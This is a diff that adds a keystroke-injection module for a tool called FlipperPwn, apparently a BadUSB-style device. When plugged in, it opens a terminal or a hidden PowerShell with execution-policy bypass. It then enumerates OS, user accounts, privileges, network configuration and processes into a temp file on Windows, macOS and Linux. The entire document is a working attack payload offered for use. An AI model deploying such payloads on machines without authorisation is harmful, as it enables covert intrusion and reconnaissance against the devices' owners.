@@ -1,0 +1,43 @@
+# FlipperPwn Module: System Information Enumeration
+# Collects OS, user, network, and process info and writes to a temp file.
+# Tested on Windows 10/11, macOS 12+, Ubuntu 20.04+
+
+NAME sys_info
+DESCRIPTION Enumerate system information (OS, user, network, processes) and save to temp file
+CATEGORY recon
+PLATFORMS WIN,MAC,LINUX
+
+# No options required — pure enumeration
+
+PLATFORM WIN
+  # Open a hidden PowerShell window via Run dialog
+  DELAY 500
+  GUI r
+  DELAY 300
+  STRING powershell -w h -nop -ep bypass
+  ENTER
+  DELAY 1000
+  # Chain all enumeration commands and pipe output to a single file
+  STRING $o="$env:TEMP\si.txt"; "=== SYSTEMINFO ===" | Out-File $o; systeminfo | Out-File $o -Append; "=== WHOAMI /ALL ===" | Out-File $o -Append; whoami /all | Out-File $o -Append; "=== IPCONFIG /ALL ===" | Out-File $o -Append; ipconfig /all | Out-File $o -Append; "=== NET USER ===" | Out-File $o -Append; net user | Out-File $o -Append; "=== TASKLIST ===" | Out-File $o -Append; tasklist | Out-File $o -Append; Start-Process notepad $o
+  ENTER
+
+PLATFORM MAC
+  # Open Spotlight, launch Terminal
+  DELAY 500
+  GUI SPACE
+  DELAY 400
+  STRING Terminal
+  ENTER
+  DELAY 1200
+  # Collect info into /tmp/si.txt and open it
+  STRING o=/tmp/si.txt; echo "=== UNAME ===" > $o; uname -a >> $o; echo "=== WHOAMI ===" >> $o; whoami >> $o; id >> $o; echo "=== IFCONFIG ===" >> $o; ifconfig >> $o; echo "=== SW_VERS ===" >> $o; sw_vers >> $o; echo "=== HARDWARE ===" >> $o; system_profiler SPHardwareDataType >> $o; open -e $o
+  ENTER
+
+PLATFORM LINUX
+  # Open a terminal emulator via keyboard shortcut
+  DELAY 500
+  CTRL ALT t
+  DELAY 1000
+  # Collect info into /tmp/si.txt; try lsb_release, fall back gracefully
+  STRING o=/tmp/si.txt; echo "=== UNAME ===" > $o; uname -a >> $o; echo "=== WHOAMI ===" >> $o; whoami >> $o; id >> $o; echo "=== IP ADDR ===" >> $o; ip a >> $o; echo "=== OS-RELEASE ===" >> $o; cat /etc/os-release >> $o 2>/dev/null; echo "=== LSB ===" >> $o; lsb_release -a >> $o 2>/dev/null; xdg-open $o 2>/dev/null || cat $o
+  ENTER
